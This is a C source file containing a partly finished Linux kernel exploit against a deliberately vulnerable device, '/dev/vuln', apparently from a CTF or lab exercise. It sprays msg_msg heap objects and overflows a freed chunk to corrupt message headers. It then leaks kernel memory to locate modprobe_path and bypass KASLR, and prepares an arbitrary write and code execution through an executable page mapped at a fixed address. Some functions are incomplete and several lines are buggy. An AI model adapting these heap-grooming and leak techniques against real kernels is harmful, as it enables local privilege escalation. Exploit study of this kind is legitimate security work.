#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>

#define PAGE_SIZE 4096
#define SLAB_NAME "kmalloc-64"
#define MSG_COPY 040000
#define LAST_5(x) (x & 0xfffff)

int fd = -1;
int qid[1000];
unsigned long offset = 0;
unsigned long next = 0;

void open_dev(){
	fd = open("/dev/vuln", O_RDWR);
	if(fd < 0){
		puts("[!] Error opening device");
		exit(-1);
	}
	puts("[*] Opened device");
}

void dev_write(char* buf, size_t n){
	if(write(fd, buf, n)<0) {
		puts("[!] Error writing to device");
		//exit(-1);
	} else {
		puts("[*] Wrote to device");
	}
}

char* dev_read(char* buf) {
	char* output = (char*)read(fd, buf, sizeof(buf));
	if (output <= 0){
		puts("[!] Error reading from device");
		exit(-1);
	}
	puts("[*] Read from device");
	return output;
}

// we want kmalloc-64
#define HEADER_SZ 48
#define MSIZE 128-HEADER_SZ

struct {
	long mtype;
	char mtext[MSIZE];
} msg;

void warm_heap(int n) {
	memset(msg.mtext, 0x69, MSIZE-1);
	msg.mtext[MSIZE] = 0;
	msg.mtype = 2;
	int msqids[n];
	size_t i;
	printf("[*] Allocating %d msg_msg\n", n);
	for(i=0; i<n; i++) {
		msqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		if (msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0) != 0)
			printf("[*] Error with msgsnd %d in warm_heap\n", msqids[i]);
	}
	printf("[*] Freeing %d msg_msg\n", n);
	for(i=0; i<n; i++) {
		if (msgrcv(msqids[i], &msg.mtext, sizeof(msg.mtext), 0, 0) == -1)
		      printf("[*] Error with msgrcv %d in spray_heap\n", msqids[i]);
	}
}

int make_q(int type) {
	msg.mtype = type;
	int id = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	if(id == -1) {
		perror("msgget");
		return -1;
	}
	return id;
}

void send_msg(int qid, int size, int c) {
	size_t msize = size - HEADER_SZ;
	struct {
		long mtype;
		char mtext[msize];
		} msg;
	msg.mtype = 1;
	memset(msg.mtext, c, msize);
	msg.mtext[msize-1] = 0;
	if(msgsnd(qid, &msg, msize, 0) == -1) {
		perror("msgsnd");
		exit(1);
	}
}

void hex_dump(char *buff, unsigned long size) {
	int i,j;
	for (i = 0; i < size/8; i++) {
		if(i % 2 == 0) {
			if (i != 0)
				printf("  \n");
		printf("  %04x  ", i*8);
		}
		unsigned long ptr = ((unsigned long *)(buff))[i];
		printf("0x%016lx", ptr);
		printf("    ");
	}
	printf("\n");
}

void check_slab(char *slab_name, int *active, int *total) {
	FILE *fp;
	char buff[1024], name[64];
	int active_num, total_num;
	fp = fopen("/proc/slabinfo", "r");
	if (!fp) {
		perror("fopen");
		return;
	}
	while (fgets(buff, 1024, fp) != NULL) {
		sscanf(buff, "%s %u %u", name, &active_num, &total_num);
		if (!strcmp(slab_name, name)) {
			*active = active_num;
			*total = total_num;
			return;
		}
	}
}

void print_slab_info() {
	int total_num, active_num;
	check_slab(SLAB_NAME, &active_num, &total_num);
	printf("[+] Checking slab total: %d active: %d free: %d\n",
		total_num, active_num, total_num-active_num);
}
void lineup_heap(size_t sz, int v2) {
	// lineup the heap for overflow
	// allocate messages
	// msg | msg | msg | msg
	// free one
	// msg | free | msg | msg
	// calling write allocates the victim
	// msg | victim | msg | msg
	// now we can overflow msg_msg header of
	// "alive" chunk
	warm_heap(sz);	
	int res = 0x41;
	size_t i = 0;
	while(i < sz) {
		qid[i] = make_q(i);
		send_msg(qid[i++], 128, res+i);
		if(v2){
			send_msg(qid[i++], 4096, res+i);
		}
	}
	// use socket struct for kernel leak
	char buff[80];
	if(msgrcv(qid[1], buff, 80, 1, IPC_NOWAIT)!=80){
		puts("[!] Error removing chunk to replace with victim");
	}
}

int isKernel(unsigned long a){
	return (a > 0xffffffff00000000);
}

unsigned long evil[50];

void leak() {
	// create buffer to overflow with:
	size_t evilsz = 160;
	memset(evil, 0, evilsz);
	for(size_t i=0; i<12; i++){
		evil[i] = 0xa;  // make driver stop parsing params
	}
	evil[16] = (unsigned long)0x4141414141414141;
	evil[17] = (unsigned long)0x4242424242424242; // struct list_head m_list;
	evil[18] = (unsigned long)0x000; // long m_type;
	int leak_sz = 0x200;
	evil[19] = leak_sz; // size_t m_ts;
	int qid0 = make_q(1);
	int qid1 = make_q(1);
	int qid2 = make_q(1);
	send_msg(qid0, 128, 0x40);
	send_msg(qid1, 128, 0x41);
	send_msg(qid2, 128, 0x42);
	socket(22, AF_INET, 0);
	char buff[80];
	// free and replace qid0 message with victim buffer to overflow
	msgrcv(qid0, buff, 80, 1, MSG_NOERROR | IPC_NOWAIT);
	dev_write((char*)evil, evilsz);
	puts("[*] Wrote into freed buffer");
	char* leaked = (char*)calloc(leak_sz, 1);
	int res = msgrcv(qid1, leaked, leak_sz, 0, MSG_COPY | IPC_NOWAIT);
	if(res>80) {
		hex_dump(leaked, leak_sz);
		unsigned long leaked_addr[leak_sz/sizeof(unsigned long)];
		memcpy(leaked_addr, leaked, leak_sz);
		printf("[*] Leaked 0x%x bytes\n", res);
		next = leaked_addr[11];
		printf("[*] Next pointer is 0x%lx\n", next);
		for(size_t i=0; i < leak_sz/sizeof(unsigned long); i++) {
			if(isKernel(leaked_addr[i]) && LAST_5(leaked_addr[i]) == 0x48700) {
				printf("[*] Mod_probe_path %lx\n", leaked_addr[i]);
				offset = (unsigned long)(leaked_addr - 0xffffffff82648700);
				break;
			}
		}
	} else {
		puts("[!] Error overwriting m_ts ");
	}
}

void arb_write() {
	// leak next chunks list_head next pointer	
	size_t evilsz = 160;
	int leak_sz = 0x100;
	evil[19] = leak_sz; // size_t m_ts
	warm_heap(800);
	//lineup_heap(800, 1); // we want everything to have k4096 chunk attached
	int qid0 = make_q(1);
	int qid1 = make_q(1);
	send_msg(qid0, 128, 0x41);
	send_msg(qid1, 128, 0x42);
	send_msg(qid1, 4096, 0x69);
	char buff[80];
	msgrcv(qid0, buff, 80, 1, MSG_NOERROR | IPC_NOWAIT);
	dev_write((char*)evil, evilsz);
	char* leaked = (char*)calloc(leak_sz, 1);
	int res = msgrcv(qid1, leaked, leak_sz, 0, MSG_COPY | IPC_NOWAIT);
	printf("Leaked 0x%x bytes\n", res);
	hex_dump(leaked, 50);
	// allocate victim next to another 128 byte chunk A
	warm_heap(800);
	
	// allocate k4096 chunk B
	
	// free A, B, C
}

#define PAGE_SZ 0x1000

void code_exec() {
	char* user_page = mmap((void*)0xdead0000, PAGE_SZ, PROT_READ|PROT_WRITE|PROT_EXEC, 
			MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	char test[PAGE_SZ];
	memset(test, 'Y', PAGE_SZ);
	memcpy(user_page, test, PAGE_SZ);
	size_t evil_sz = 204;
	for(size_t i=16; i < evil_sz/sizeof(unsigned long); i++) {
		evil[i] = 0x0;
	}
	evil[24] = (unsigned long)user_page;
	warm_heap(800); // clean the heap
	for(size_t i=0; i<30; i++){
		socket(22, AF_INET, 0);
	}
	dev_write((char*)evil, evil_sz);
	for(size_t i=0; i<30; i++) {
		socket(22, AF_INET, 0);
	}
}

int main() {
	open_dev();
	// leak to get around aslr
	leak();
	// ffffffff8107e300 t call_usermodehelper_exec_work
	// ffffffff82648700 D modprobe_path
	if(offset){
		arb_write();
	//	code_exec();
	}
}
